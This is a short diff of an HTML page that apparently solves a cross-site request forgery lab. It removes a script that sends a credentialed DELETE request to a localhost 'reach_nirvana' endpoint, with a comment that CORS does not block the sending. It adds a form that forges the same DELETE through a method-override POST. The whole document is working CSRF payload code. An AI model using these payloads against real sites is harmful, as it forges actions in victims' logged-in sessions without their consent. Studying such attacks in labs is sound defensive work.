@@ -5,22 +5,9 @@
 
   
 
-<button>Submit</button>
-
-<script>
-document.querySelector("button").onclick = async () => {
-    // Send DELETE (CORS doesn't block sending)
-    fetch("http://127.0.0.1:3000/reach_nirvana", {
-        method: "DELETE",
-        credentials: "include"
-    });
-
-    // Then navigate to it
-    setTimeout(() => {
-        window.location = "http://127.0.0.1:3000/reach_nirvana";
-    }, 500);
-};
-</script>
+<form action="http://127.0.0.1:3000/reach_nirvana?_method=DELETE" method="POST">
+  <button>Submit</button>
+</form>
 
 
 
